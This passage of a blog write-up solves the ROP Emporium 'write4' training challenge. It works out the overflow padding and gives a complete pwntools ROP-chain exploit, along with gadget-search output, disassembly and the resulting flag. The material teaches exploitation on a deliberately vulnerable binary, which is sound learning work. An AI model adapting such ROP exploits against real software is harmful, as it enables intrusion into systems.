<li>From line 32, we know that it puts <code>rax</code> (which is the buffer size) to <code>rsi.</code> And <code>rax</code> comes from line 30, which is <code>[rbp+s]</code> and <code>s</code> equals <code>0x20</code> (from line 4). Thus we know the buffer size is <code>0x20</code> bytes.</li>
<li>Before the return address, there lies a <code>rbp,</code> so we have to plus another 8 bytes to <code>0x20</code>. Thus, we got <code>40</code> bytes.</li>
</ul>
<p>In both ways, we can conclude that to reach the return address we have to insert <code>40</code> bytes padding.</p>
<p>Once we control the <code>rip</code>, we can make this binary execute anything we want!</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><details>
<summary style="display:list-item">Exploit code</summary>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(log_level=<span class="string">&#x27;info&#x27;</span>)</span><br><span class="line">padding = cyclic_find(<span class="string">&quot;kaaa&quot;</span>)</span><br><span class="line">data_address = <span class="number">0x601028</span></span><br><span class="line">writeable_addr_2 = <span class="number">0x601030</span></span><br><span class="line">pop_r14_r15 = <span class="number">0x400690</span></span><br><span class="line">r14_deref_r15 = <span class="number">0x400628</span></span><br><span class="line">pop_rdi = <span class="number">0x400693</span></span><br><span class="line">usefulFunction_adr = <span class="number">0x400620</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./write4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  1 - Fill the padding</span></span><br><span class="line">padding = <span class="string">&quot;A&quot;</span> * padding</span><br><span class="line">payload = padding.encode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 - Insert first part of file name</span></span><br><span class="line">payload += p64(pop_r14_r15)</span><br><span class="line">payload += p64(data_address)</span><br><span class="line">payload += <span class="string">b&quot;./flag.t&quot;</span></span><br><span class="line">payload += p64(r14_deref_r15)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 - Insert Second part of file name</span></span><br><span class="line"><span class="comment"># Store &quot;./flag.t&quot; to rdi</span></span><br><span class="line"><span class="comment"># Because the &quot;./flag.txt&quot; is too long, and the gadget we get can only move qword at a time (8 byte), so we have to move the string twice</span></span><br><span class="line">payload += p64(pop_r14_r15)</span><br><span class="line">payload += p64(writeable_addr_2)</span><br><span class="line">payload += <span class="string">b&quot;xt\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="comment"># Store the &quot;xt\x00\x00\x00\x00\x00\x00&quot; string to [r14+0x8]</span></span><br><span class="line">payload += p64(r14_deref_r15)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 - Store &quot;./flag.txt&quot; adderss to rdi</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(data_address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5 - Evoke usefulFunction</span></span><br><span class="line">payload += p64(usefulFunction_adr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
</details>

<p>I’ll provide some illustrations of finding the address from line 4 to line 9 in the exploit code.</p>
<details>
    <summary style="display:list-item">1. 0x601028</summary>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jeff14994@jeff14994-VirtualBox:~/Desktop/asu-hacking/<span class="number">03</span>_03$ readelf --section-headers -W ./write4 | grep data</span><br><span class="line">  [<span class="number">15</span>] .rodata           PROGBITS        <span class="number">00000000004006b</span>0 <span class="number">0006b</span>0 <span class="number">000010</span> <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">23</span>] .data             PROGBITS        <span class="number">0000000000601028</span> <span class="number">001028</span> <span class="number">000010</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">8</span></span><br></pre></td></tr></table></figure>
</details>

<ul>
<li>The reason that we choose <code>.data</code> not <code>.rodata</code> is because it’s <code>WA</code>(writeable and accessible). Thus that’s how we get <code>0x601028.</code></li>
</ul>
<ol start="2">
<li>0x601030 is calculated by <code>0x601028 + 0x8</code>, since the <code>./flag.txt</code> (10 bytes) is too long, and the gadget we get can only move qword (8 bytes) at a time, so we have to move the leftover after next 8 bytes.</li>
</ol>
<details>
<summary style="display:list-item">3. Use the usefulGadgets which is mentioned above to get 0x400628 and 0x400690 </summary>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jeff14994@jeff14994-VirtualBox:~/Desktop/asu-hacking/<span class="number">03</span>_03$ ropper -f ./write4 | grep r14</span><br><span class="line">[INFO] Load gadgets from cache</span><br><span class="line">[LOAD] loading... <span class="number">100</span>%</span><br><span class="line">[LOAD] removing <span class="type">double</span> gadgets... <span class="number">100</span>%</span><br><span class="line"><span class="number">0x0000000000400628</span>: mov qword ptr [r14], r15; ret;</span><br><span class="line"><span class="number">0x0000000000400690</span>: pop r14; pop r15; ret;</span><br></pre></td></tr></table></figure>
</details>

<ul>
<li>We use <code>pop r14; pop r15; ret;</code> to store the pointer and the filename respectively. Besides, <code>mov qword ptr [r14], r15; ret;</code> it first dereferences r14 and stores the value from r15 to it.</li>
</ul>
<details>
<summary style="display:list-item">4. 0x400693</summary>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jeff14994@jeff14994-VirtualBox:~/Desktop/asu-hacking/<span class="number">03</span>_03$ ropper -f ./write4 | grep rdi</span><br><span class="line">[INFO] Load gadgets from cache</span><br><span class="line">[LOAD] loading... <span class="number">100</span>%</span><br><span class="line">[LOAD] removing <span class="type">double</span> gadgets... <span class="number">100</span>%</span><br><span class="line"><span class="number">0x0000000000400693</span>: pop rdi; ret;</span><br></pre></td></tr></table></figure>
</details>

<ul>
<li>It’s the gadget to store the pointer to the filename<details>
<summary style="display:list-item">5. 0x400620</summary></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400617</span> usefulFunction  proc near</span><br><span class="line">.text:<span class="number">0000000000400617</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000400618</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">000000000040061B</span>                 mov     edi, offset aNonexistent ; <span class="string">&quot;nonexistent&quot;</span></span><br><span class="line">.text:<span class="number">0000000000400620</span>                 call    _print_file</span><br><span class="line">.text:<span class="number">0000000000400625</span>                 nop</span><br><span class="line">.text:<span class="number">0000000000400626</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">0000000000400627</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400627</span> usefulFunction  endp</span><br></pre></td></tr></table></figure>
</details>

<ul>
<li>Although usefulFunction starts at <code>0x400617</code>, it changes the <code>rdi</code> at <code>0x40061B</code>, which destroys our plan. Thus we decide to jump from <code>0x400620</code> and make it only call <code>_print_file</code> without changing <code>rdi.</code></li>
</ul>
<h2 id="Get-the-flag"><a href="#Get-the-flag" class="headerlink" title="Get the flag"></a>Get the flag</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">jeff14994@jeff14994-VirtualBox:~/Desktop/asu-hacking/<span class="number">03</span>_03$ python exploit.py</span><br><span class="line">[+] Starting local process <span class="string">&#x27;./write4&#x27;</span>: pid <span class="number">31741</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">write4 by ROP Emporium</span><br><span class="line">x86_64</span><br><span class="line"></span><br><span class="line">Go ahead and give me the input already!</span><br><span class="line"></span><br><span class="line">&gt; Thank you!</span><br><span class="line">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading in interactive</span><br></pre></td></tr></table></figure>

<p>Happy ropping!</p>

    </article>
    <!-- license -->
    
        <div class="license-wrapper">
            <p>Author：<a href="https://jeff14994.github.io">atx0mg</a>
            <p>Link：<a href="https://jeff14994.github.io/2022/03/11/write4-rop/">https://jeff14994.github.io/2022/03/11/write4-rop/</a>
            <p>Publish date：<a href="https://jeff14994.github.io/2022/03/11/write4-rop/">March 11th 2022, 1:38:21 am</a>
            <p>Update date：<a href="https://jeff14994.github.io/2022/03/11/write4-rop/">April 10th 2025, 11:37:48 am</a>
            <p>License：This article is licensed under CC BY-NC 4.0</p>
        </div>
    
    <!-- paginator -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
                <a href="/2022/07/04/AIS3-2022-Pre-exam/" title="AIS3 2022 Pre-exam">
                    <div class="nextTitle">AIS3 2022 Pre-exam</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href="/2021/12/06/MetaCTF-2021/" title="MetaCTF 2021">
                    <div class="prevTitle">MetaCTF 2021</div>
                </a>
            
        </li>
    </ul>
    <!-- comment -->
    
        <div class="post-comment">
            <!-- 来必力 City 版安装代码 -->


            

            

            

            <!-- utteranc评论 -->


            <!-- partial('_partial/comment/changyan') -->
            <!--PC版-->


            
            

            

        </div>
    
    <!-- timeliness note -->
    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
    
    <!-- Mathjax -->
    
</main>

                <!-- profile -->
                
            </div>
            <footer class="footer footer-unloaded">
    <!-- social  -->
    
        <div class="social">
            
    
        
            
                <a href="mailto:jeff14994 [at] gmail.com" class="iconfont-archer email" title=email ></a>
            
        
    
        
            
                <a href="//github.com/jeff14994" class="iconfont-archer github" target="_blank" title=github></a>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
            
                <a href="https://www.facebook.com/jeff.hong.14994" class="iconfont-archer facebook" target="_blank" title=facebook></a>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
            
                <a href="https://www.linkedin.com/in/jeff14994/" class="iconfont-archer linkedin" target="_blank" title=linkedin></a>
            
        
    
        
    
        
            
                <a href="https://hackmd.io/@jeff14994" class="iconfont-archer others" target="_blank" title=others></a>
            
        
    
        
    


        </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- website approve for Chinese user -->
    
    <!-- 不蒜子  -->
    
        <div class="busuanzi-container">
            
             
                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
            
        </div>
    	
</footer>

        </div>
        <!-- toc -->
        
            <div class="toc-wrapper toc-wrapper-loding" style=







    top:50vh;

>
                <div class="toc-catalog">
                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                </div>
                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Goal"><span class="toc-number">1.</span> <span class="toc-text">Goal</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Description"><span class="toc-number">2.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Let%E2%80%99s-download-the-binary"><span class="toc-number">3.</span> <span class="toc-text">Let’s download the binary!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Static-Analysis-with-IDA-Pro"><span class="toc-number">4.</span> <span class="toc-text">Static Analysis (with IDA Pro)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dynamic-Analysis-with-GDB"><span class="toc-number">5.</span> <span class="toc-text">Dynamic Analysis (with GDB)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">6.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Get-the-flag"><span class="toc-number">7.</span> <span class="toc-text">Get the flag</span></a></li></ol>
            </div>
        
        <!-- sidebar -->
        <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
        <div class="sidebar-panel-archives">
    <!-- 在 ejs 中将 archive 按照时间排序 -->
    
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    
    
    
    
    <div class="total-and-search">
        <div class="total-archive">
        Total : 11
        </div>
        <!-- search  -->
        
    </div>
    
    <div class="post-archive">
    
        
            
            
            <div class="archive-year"> 2022 </div>
            <ul class="year-list">
            
        
        <li class="archive-post-item">
            <span class="archive-post-date">07/04</span>
            <a class="archive-post-title" href="/2022/07/04/AIS3-2022-Pre-exam/">AIS3 2022 Pre-exam</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/11</span>
            <a class="archive-post-title" href="/2022/03/11/write4-rop/">write4 rop</a>
        </li>
    
        
            
            
                
                </ul>
            
            <div class="archive-year"> 2021 </div>
            <ul class="year-list">
            
        
        <li class="archive-post-item">
            <span class="archive-post-date">12/06</span>
            <a class="archive-post-title" href="/2021/12/06/MetaCTF-2021/">MetaCTF 2021</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/28</span>
            <a class="archive-post-title" href="/2021/11/28/TFCCTF-2021/">TFCCTF 2021</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/15</span>
            <a class="archive-post-title" href="/2021/11/15/K3RN3LCTF-2021/">K3RN3LCTF 2021</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/06</span>
            <a class="archive-post-title" href="/2021/11/06/Dam-CTF-2021/">Dam CTF 2021</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">10/31</span>
            <a class="archive-post-title" href="/2021/10/31/Killer-Queen-CTF-2021/">Killer Queen CTF 2021</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">10/23</span>
            <a class="archive-post-title" href="/2021/10/23/BuckeyeCTF-2021/">BuckeyeCTF 2021</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">09/19</span>
            <a class="archive-post-title" href="/2021/09/19/SunshineCTF-2021/">SunshineCTF 2021</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">09/13</span>
            <a class="archive-post-title" href="/2021/09/13/CSAWCTF-2021/">CSAWCTF 2021</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/28</span>
            <a class="archive-post-title" href="/2021/08/28/FWordCTF-2021/">FWordCTF 2021</a>
        </li>
    
    </div>
</div>

        <div class="sidebar-panel-tags">
    <div class="sidebar-tags-name">
        
            <span class="sidebar-tag-name" data-tags="ctf">
                <span class="iconfont-archer">&#xe606;</span>
                ctf
            </span>
        
            <span class="sidebar-tag-name" data-tags="AIS3">
                <span class="iconfont-archer">&#xe606;</span>
                AIS3
            </span>
        
            <span class="sidebar-tag-name" data-tags="forensics">
                <span class="iconfont-archer">&#xe606;</span>
                forensics
            </span>
        
            <span class="sidebar-tag-name" data-tags="wargame">
                <span class="iconfont-archer">&#xe606;</span>
                wargame
            </span>
        
            <span class="sidebar-tag-name" data-tags="2022">
                <span class="iconfont-archer">&#xe606;</span>
                2022
            </span>
        
            <span class="sidebar-tag-name" data-tags="rop">
                <span class="iconfont-archer">&#xe606;</span>
                rop
            </span>
        
            <span class="sidebar-tag-name" data-tags="ROP Emporium">
                <span class="iconfont-archer">&#xe606;</span>
                ROP Emporium
            </span>
        
            <span class="sidebar-tag-name" data-tags="pwn">
                <span class="iconfont-archer">&#xe606;</span>
                pwn
            </span>
        
    </div>
    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
    </div> 
    <div class="sidebar-tags-list"></div>
</div>

        <div class="sidebar-panel-categories">
    <div class="sidebar-categories-name">
    
    </div>
    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
    <div class="sidebar-categories-list"></div>
</div>

    </div>
</div>

        <!-- site-meta -->
        <script>
    var siteMetaRoot = "/"
    if (siteMetaRoot === "undefined") {
        siteMetaRoot = '/'
    }
    var siteMeta = {
        url: "https://jeff14994.github.io",
        root: siteMetaRoot,
        author: "atx0mg"
    }
</script>

        <!-- import experimental options here -->
        <!-- Custom Font -->


        <!-- main func -->
        <script src="/scripts/main.js?v=20211217"></script>
        <!-- dark mode -->
        <script src="/scripts/dark.js?v=20211217"></script>
        <!-- fancybox -->
        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
        <!-- algolia -->
        
        <!-- busuanzi -->
        
            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
        
        <!-- CNZZ -->
        
        <!-- async load share.js -->
        
            <script src="/scripts/share.js?v=20211217" async></script>
        
        <!-- mermaid -->
        
    </body>
</html>
